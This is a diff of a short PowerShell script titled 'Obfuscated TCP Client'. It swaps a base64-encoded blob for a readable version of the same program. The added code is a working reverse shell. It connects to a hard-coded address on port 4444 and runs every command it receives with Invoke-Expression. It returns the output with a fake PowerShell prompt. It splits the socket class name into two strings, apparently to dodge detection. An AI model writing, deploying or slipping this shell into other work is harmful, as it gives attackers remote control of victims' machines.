@@ -1,1 +1,23 @@
-JGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguMS4xNScsIDQ0NDQpCiRzID0gJGMuR2V0U3RyZWFtKCkKW2J5dGVbXV0kYiA9IDAuLjY1NTM1fCV7MH0KJG0gPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoIkNPTk5FQ1RFRGBuUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKQokcy5Xcml0ZSgkbSwwLCRtLkxlbmd0aCkKd2hpbGUoKCRpID0gJHMuUmVhZCgkYiwgMCwgJGIuTGVuZ3RoKSkgLW5lIDApewogICAgJGQgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsICRpKQogICAgdHJ5IHsgJHNiID0gKElFWCAkZCAyPiYxIHwgT3V0LVN0cmluZykgfSBjYXRjaCB7ICRzYiA9ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIH0KICAgICRvdXQgPSAkc2IgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiCiAgICAkbSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkb3V0KQogICAgJHMuV3JpdGUoJG0sMCwkbS5MZW5ndGgpCiAgICAkcy5GbHVzaCgpCn0KJGMuQ2xvc2UoKQo=
+# Obfuscated TCP Client
+$a = "System.Net.Sockets."
+$b = "TCPClient"
+$c = New-Object ($a + $b)("192.168.1.15", 4444) # Change IP if needed
+$s = $c.GetStream()
+
+[byte[]]$b_arr = 0..65535|%{0}
+$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> ")
+$s.Write($m,0,$m.Length)
+
+while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
+    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
+    try { 
+        $sb = (Invoke-Expression $d 2>&1 | Out-String) 
+    } catch { 
+        $sb = $_.Exception.Message 
+    }
+    $out = $sb + "PS " + (pwd).Path + "> "
+    $m = ([text.encoding]::ASCII).GetBytes($out)
+    $s.Write($m,0,$m.Length)
+    $s.Flush()
+}
+$c.Close()
